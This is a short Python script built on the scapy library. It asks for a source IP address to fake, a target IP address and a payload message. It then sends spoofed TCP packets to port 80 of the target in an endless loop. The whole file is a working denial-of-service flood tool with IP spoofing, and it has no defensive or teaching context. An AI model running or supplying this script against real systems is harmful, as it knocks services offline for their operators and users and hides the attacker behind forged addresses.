#!/usr/bin/python

from scapy.all import *

def synFlood(src, tgt, message):
    #for dport in range(1024,65535):
        dport = 80
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=4444, dport=dport)
        RAWlayer = Raw(load=message)
        ptk =  IPlayer/TCPlayer/RAWlayer
        send(ptk)

source = raw_input("[*] Enter source ip address to fake: ")
target = raw_input("[*] Enter targets ip address: ")
message = raw_input("[*] Enter the message fot TCP payload: ")

while True:
    synFlood(source, target, message)
